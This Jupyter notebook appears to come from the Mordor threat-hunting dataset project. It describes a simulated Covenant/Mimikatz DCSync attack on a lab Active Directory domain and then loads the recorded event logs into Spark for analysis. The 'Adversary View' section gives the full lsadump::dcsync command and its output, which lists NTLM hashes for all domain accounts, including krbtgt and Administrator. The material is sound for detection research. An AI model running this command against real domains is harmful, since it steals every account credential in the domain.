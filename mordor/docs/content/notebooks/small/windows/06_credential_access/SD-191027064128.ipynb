{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Covenant DCSync All"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| id                | SD-191027064128 |\n",
    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| creation date     | 2019/10/27 |\n",
    "| platform          | Windows |\n",
    "| Mordor Environment| shire |\n",
    "| Simulation Type   | C2 |\n",
    "| Simulation Tool   | Covenant |\n",
    "| Simulation Script | https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/Credentials/Mimikatz.cs |\n",
    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_dcsync_all.tar.gz |"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents adversaries abusing Active Directory Replication services to retrieve NTLM hashes from all domain accounts"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "Covenant Commands\n",
    "\n",
    "Mimikatz /command:\"\\\"lsadump::dcsync /domain:shire.com /all /csv\\\"\"\n",
    "\n",
    "  .#####.   mimikatz 2.2.0 (x64) #18362 Oct  8 2019 14:30:39\n",
    " .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n",
    " ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n",
    " ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n",
    " '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n",
    "  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n",
    "\n",
    "mimikatz(powershell) # lsadump::dcsync /domain:shire.com /all /csv\n",
    "[DC] 'shire.com' will be the domain\n",
    "[DC] 'HFDC01.shire.com' will be the DC server\n",
    "[DC] Exporting domain 'shire.com'\n",
    "1114\tsysmonsvc\t99264710bedea2ea17362d6d3ec3df1e\n",
    "1008\tHFDC01$\t66665b82e8a05cfd0b3afa20822a6fae\n",
    "1116\tWECSERVER$\t304deabe963ec32d155f10057921c459\n",
    "1113\tlrodriguez\tedfd5efe1b4f98b0ebaef62bb5dad721\n",
    "1111\tnmartha\t5e51c1e48ad3f6d441359fcfd813204b\n",
    "1120\tFILE001$\taaa1ab5c0d3db11c489d351983e776ff\n",
    "1117\tIT001$\t07da73e54ccb4cf559737e184520487c\n",
    "1118\tACCT001$\tb2707b48f51bd28dd6525b2d496d7029\n",
    "1119\tHR001$\t09115fa4efe7112a61fd4221cb503fd0\n",
    "1112\tpgustavo\t81d310fa34e6a56a31145445891bb7b8\n",
    "502\tkrbtgt\t6a3bc2eaa40be0ed9edabc0473528fd2\n",
    "500\tAdministrator\tc3465384d3ca169d20fd28783e8d3914\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Explore Mordor Dataset"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Initialize Analytics Engine"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from openhunt.mordorutils import *\n",
    "spark = get_spark()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Download & Process Mordor File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/credential_access/covenant_dcsync_all.tar.gz\"\n",
    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Get to know your data"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "df = spark.sql(\n",
    "    '''\n",
    "SELECT channel, COUNT(1)\n",
    "FROM mordorTable\n",
    "GROUP BY channel\n",
    "    '''\n",
    ")\n",
    "df.show(10,False)\n",
    "        "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 4
}
